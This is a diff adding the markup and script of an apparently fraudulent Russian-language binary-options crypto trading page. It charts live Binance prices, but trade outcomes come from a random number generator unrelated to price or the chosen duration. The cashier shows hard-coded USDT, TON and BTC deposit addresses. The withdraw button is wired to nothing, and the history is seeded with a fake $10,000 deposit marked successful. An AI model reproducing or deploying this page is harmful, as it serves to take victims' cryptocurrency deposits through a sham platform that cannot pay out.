@@ -184,4 +184,157 @@
 
     <div class="trade-panel">
         <div class="field"><label>СУММА (USDT)</label><input type="number" id="tAmt" value="100"></div>
-        <div class="field"><label>ВРЕМЯ
+        <div class="field"><label>ВРЕМЯ (СЕК)</label><input type="number" id="tTime" value="30"></div>
+        <button class="btn-exec btn-call" onclick="trade('CALL')">ВЫШЕ ↑</button>
+        <button class="btn-exec btn-put" onclick="trade('PUT')">НИЖЕ ↓</button>
+    </div>
+</div>
+
+<div id="cashierModal" class="modal">
+    <div class="modal-box">
+        <div class="modal-header">
+            <div class="m-tab active" id="tDep" onclick="setTab('dep')">ДЕПОЗИТ</div>
+            <div class="m-tab" id="tWit" onclick="setTab('wit')">ВЫВОД</div>
+            <div class="m-tab" id="tHis" onclick="setTab('his')">ИСТОРИЯ</div>
+        </div>
+        
+        <div class="m-content" id="depContent">
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+                <button class="tool-btn" onclick="showAddr('USDT TRC20', 'TRRPjzHTcHeBLzCuR5GyMQ6osvQMk3Vnq7')">USDT TRC20</button>
+                <button class="tool-btn" onclick="showAddr('TON', 'UQDkdhn6ugwcRTBxzl6x5Ssxn-DD3wiRGi6e-c4yy1HAcoXa')">TON</button>
+                <button class="tool-btn" onclick="showAddr('BTC', 'bc1qvf4wevx5lyjsz5l6mtpq9rs6qehssf5rmzfv4t')">BITCOIN</button>
+            </div>
+            <div id="addrDisplay" class="wallet-card" style="display:none;">
+                <div class="wallet-addr" id="addrVal"></div>
+            </div>
+        </div>
+
+        <div class="m-content" id="witContent" style="display:none;">
+            <div class="field"><label>АДРЕС</label><input type="text"></div>
+            <button class="btn-exec btn-call" style="width:100%; margin-top:10px; height:45px;">ВЫВЕСТИ</button>
+        </div>
+
+        <div class="m-content" id="hisContent" style="display:none;">
+            <div class="history-wrap">
+                <table>
+                    <thead><tr><th>ТИП</th><th>СУММА</th><th>СТАТУС</th></tr></thead>
+                    <tbody id="cashHistory">
+                        <tr><td>Депозит</td><td>$10,000</td><td style="color:var(--green)">Успех</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <p onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; padding:15px; border-top:1px solid var(--border);">ЗАКРЫТЬ</p>
+    </div>
+</div>
+
+<script>
+    let chart, candleSeries, barSeries, areaSeries, curSym = "BTCUSDT", lastP = 0, curAcc = 'demo', curInt = '1m', curType = 'candle';
+    let bals = { demo: 10000, real: 0 };
+
+    function init() {
+        chart = LightweightCharts.createChart(document.getElementById('chart'), {
+            layout: { background: { color: '#000' }, textColor: '#848e9c' },
+            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
+            timeScale: { timeVisible: true, secondsVisible: true }
+        });
+        setChartType('candle');
+        loadData();
+    }
+
+    function setChartType(type) {
+        curType = type;
+        if(candleSeries) chart.removeSeries(candleSeries);
+        if(barSeries) chart.removeSeries(barSeries);
+        if(areaSeries) chart.removeSeries(areaSeries);
+
+        document.querySelectorAll('.toolbar-group .tool-btn').forEach(b => b.classList.remove('active'));
+
+        if(type === 'candle') {
+            candleSeries = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d', borderVisible: false });
+            document.getElementById('btnCandle').classList.add('active');
+        } else if(type === 'bar') {
+            barSeries = chart.addBarSeries({ upColor: '#0ecb81', downColor: '#f6465d' });
+            document.getElementById('btnBar').classList.add('active');
+        } else {
+            areaSeries = chart.addAreaSeries({ lineColor: '#0ecb81', topColor: 'rgba(14, 203, 129, 0.4)', bottomColor: 'rgba(14, 203, 129, 0)' });
+            document.getElementById('btnArea').classList.add('active');
+        }
+        loadData();
+    }
+
+    function loadData() {
+        let apiInt = curInt;
+        if(curInt.includes('s')) apiInt = '1m'; 
+        
+        fetch(`https://api.binance.com/api/v3/klines?symbol=${curSym}&interval=${apiInt}&limit=500`)
+            .then(r => r.json()).then(data => {
+                const formatted = data.map(d => ({ time: d[0]/1000, open: +d[1], high: +d[2], low: +d[3], close: +d[4], value: +d[4] }));
+                if(curType === 'candle') candleSeries.setData(formatted);
+                else if(curType === 'bar') barSeries.setData(formatted);
+                else areaSeries.setData(formatted);
+                startWS();
+            });
+    }
+
+    function startWS() {
+        if(window.ws) window.ws.close();
+        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
+        window.ws.onmessage = e => {
+            const k = JSON.parse(e.data).k;
+            lastP = +k.c;
+            const update = { time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastP, value: lastP };
+            if(curType === 'candle') candleSeries.update(update);
+            else if(curType === 'bar') barSeries.update(update);
+            else areaSeries.update(update);
+        };
+    }
+
+    function setPeriod(p, btn) {
+        curInt = p;
+        document.querySelectorAll('.toolbar-group:first-child .tool-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        loadData();
+    }
+
+    function toggleDrop(id) {
+        const d = document.getElementById(id);
+        d.style.display = d.style.display === 'flex' ? 'none' : 'flex';
+    }
+
+    function setAsset(s) {
+        curSym = s;
+        document.getElementById('curAsset').innerText = s.replace('USDT', ' / USDT');
+        loadData();
+    }
+
+    function setAcc(a) { curAcc = a; updateBal(); }
+    function updateBal() { document.getElementById('balance').innerText = `$${bals[curAcc].toLocaleString()}`; }
+    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+    function closeModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+    function closeAuth() { document.getElementById('authOverlay').style.display = 'none'; }
+    
+    function setTab(t) {
+        document.querySelectorAll('.m-tab').forEach(b => b.classList.remove('active'));
+        document.getElementById('t' + t.charAt(0).toUpperCase() + t.slice(1)).classList.add('active');
+        document.getElementById('depContent').style.display = t === 'dep' ? 'block' : 'none';
+        document.getElementById('witContent').style.display = t === 'wit' ? 'block' : 'none';
+        document.getElementById('hisContent').style.display = t === 'his' ? 'block' : 'none';
+    }
+
+    function showAddr(name, val) {
+        document.getElementById('addrDisplay').style.display = 'block';
+        document.getElementById('addrVal').innerText = val;
+    }
+
+    function trade(type) {
+        const amt = +document.getElementById('tAmt').value;
+        if(amt > bals[curAcc]) return alert("Недостаточно средств");
+        bals[curAcc] -= amt; updateBal();
+        setTimeout(() => { if(Math.random() > 0.45) bals[curAcc] += amt * 1.82; updateBal(); }, 3000);
+    }
+
+    window.onload = init;
+</script>
+</body>
+</html>
